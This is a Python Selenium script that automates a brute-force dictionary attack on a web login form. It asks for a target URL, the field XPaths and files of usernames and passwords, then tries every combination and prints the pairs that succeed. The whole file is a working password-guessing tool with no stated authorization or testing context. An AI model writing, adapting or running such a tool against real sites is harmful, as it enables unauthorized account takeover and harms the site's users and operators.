from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager
from webdriver_manager.firefox import GeckoDriverManager
from webdriver_manager.microsoft import EdgeChromiumDriverManager
import time

def get_webdriver(browser_choice):
    if browser_choice.lower() == 'chrome':
        driver = webdriver.Chrome(ChromeDriverManager().install())
    elif browser_choice.lower() == 'firefox':
        driver = webdriver.Firefox(executable_path=GeckoDriverManager().install())
    elif browser_choice.lower() == 'edge':
        driver = webdriver.Edge(EdgeChromiumDriverManager().install())
    else:
        raise ValueError("Unsupported browser! Choose from 'chrome', 'firefox', or 'edge'.")
    return driver

# Gather user input
U = input('Enter the Target Website Url:')
a = input('Enter the xpath of username field:')
b = input('Enter the xpath of password field:')
c = input('Enter the xpath of login/submit button field:')
d = input('Enter path of username file:')
e = input('Enter path of the password file:')
f = input('Enter a word which comes in login is successful Url:')
browser_choice = input('Enter your browser choice (chrome, firefox, edge):')

# Initialize the WebDriver
driver = get_webdriver(browser_choice)

def test_login(username, password):
    try:
        # Navigate to the target URL
        driver.get(U)

        # Find the username, password fields and login button
        username_field = WebDriverWait(driver, 3).until(
            EC.presence_of_element_located((By.XPATH, a))
        )
        password_field = WebDriverWait(driver, 3).until(
            EC.presence_of_element_located((By.XPATH, b))
        )
        login_button = WebDriverWait(driver, 3).until(
            EC.element_to_be_clickable((By.XPATH, c))
        )

        # Clear the fields and input the username and password
        username_field.clear()
        password_field.clear()
        username_field.send_keys(username)
        password_field.send_keys(password)
        login_button.click()

        # Wait for the login attempt to process
        WebDriverWait(driver, 3).until(
            lambda d: d.current_url != U
        )

        # Check if login is successful
        if f in driver.current_url:
            print(f'Successful login: {username}:{password}')
            return True
        else:
            print(f'Failed login: {username}:{password}')
            return False
    except Exception as e:
        print(f"Error during login: {e}")
        return False

def read_lines_from_file(filename):
    with open(filename, 'r') as file:
        return [line.strip() for line in file.readlines()]

if __name__ == '__main__':
    usernames = read_lines_from_file(d)
    passwords = read_lines_from_file(e)

    for username in usernames:
        for password in passwords:
            if test_login(username, password):
                break  # Stop if successful login is found

    driver.quit()
